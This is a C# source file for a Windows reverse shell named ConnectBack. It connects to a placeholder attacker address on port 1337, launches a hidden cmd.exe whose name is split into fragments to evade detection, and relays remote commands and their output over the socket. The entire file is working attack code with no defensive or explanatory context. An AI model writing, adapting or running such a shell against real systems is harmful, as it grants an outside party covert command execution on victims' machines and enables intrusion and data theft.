using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack{
	public class Program{
		static StreamWriter streamWriter;

		public static void Main(string[] args){
			using(TcpClient client = new TcpClient("IP_ADDRESS", 1337)){
				using(Stream stream = client.GetStream()){
					using(StreamReader streamReader = new StreamReader(stream)){
						streamWriter = new StreamWriter(stream);
						
						StringBuilder strInput = new StringBuilder();

						Process process = new Process();
						process.StartInfo.FileName = "c"+"md"+".ex"+"e";
						process.StartInfo.CreateNoWindow = true;
						process.StartInfo.UseShellExecute = false;
						process.StartInfo.RedirectStandardOutput = true;
						process.StartInfo.RedirectStandardInput = true;
						process.StartInfo.RedirectStandardError = true;
						process.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						process.Start();
						process.BeginOutputReadLine();

						while(true){
							strInput.Append(streamReader.ReadLine());
							//strInput.Append("\n");
							process.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine){
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data)){
                try{
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}